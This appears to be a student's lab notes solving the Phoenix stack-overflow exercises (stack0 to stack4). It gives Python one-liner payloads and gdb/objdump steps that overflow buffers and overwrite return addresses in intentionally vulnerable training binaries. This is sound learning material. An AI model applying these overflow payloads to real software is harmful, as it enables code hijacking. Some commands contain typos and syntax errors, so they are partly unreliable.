# Phoenix: is basic binar exploitation challenge:

# Note: challenges are located in /opt/phoenix/amd64


## Stack0:
- gets take un check data which could be used to create the buffer over flow:

```
python -c 'print("A"*70)' | ./stack_zero

```

## Stack1:

- The challenge is similar to the above challenge but one has to look for following things:
  1- read the little-Endians -> which store data from large to smaller values, so after the overflow provide the variables value in reverse order
  2- In the code the user provided input is taken as the argument in the for of ``` char ***argv ``` which is then copied to the buffer of length 64 buffer[64]:
  
  ```
   strcpy(locals.buffer, argv[1]);
  ```
  
  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
  ```
  /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
  
  ```
## Stack2:
- In this challenge code is using the envirnment variable with the name of ==ExploitateEducation== to be passed as the argument in the stack.
- so in order make the buffer overflow happen we will do :
```
export ExploitEducation = $(python -c 'print("A" * 65 + \x0a\x09\x0a\x0d)')

```
Simply run the function and we will have the over flow.

## stack3:

- In the stack three one has to first find the address of the complete_level function:
```
objdump -d ./stack-three | grep complete_level
000000000040069d <complete_level>:

```
```
0x40069d
python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
```

## stack4

- In this challenge the buffer ovflow occurs in the start_level funtions which is called in the main() function:

```

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}


```

- What we have to do is:
  1- overflow the stack buffer until it reach the return address of strart_level() function
  2- keep in mind all the functions returns addressess are saved on the stack.
  3- the return address of the start_level will also be present on the stack.
  
- How to find the write amount of characters to overflow the buffer:
  1- open the program in the gdb.
  2- place the breakpoint after the gets() function.
  3- fill the buffer with dummy data:
	  ```
	  run < <(python -c 'print("A" * 64)')
	  ```
  4- Now find the location of overflowed function:
	  ```
	  x/100x $rsp // rsp is the stack pointer it is the top most address of the stack
	  ```
  5- the above prompt will dump the address and data stored on the stack in form of hex.
  6- The top left address will mostly likely show the overflowed buffer.
  7- next step is to find the return address of start_level which could by find by:
	  ```
	  info frame // the <saved $rip=????> will be the return address of the start level function
	  ```
  8- To calculate the right amount of characters to reach the start_level return address one can subtract the address of overflowed buffer with the return address
  of the start_level function.
  
	  ```
	  0x7fffffffe4f8 - 0x7fffffffe4a0 = 0x58 
	  which in decimal is = 88
	  ```
  9- Now to curate a payload:
	  ```
	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
	  ```
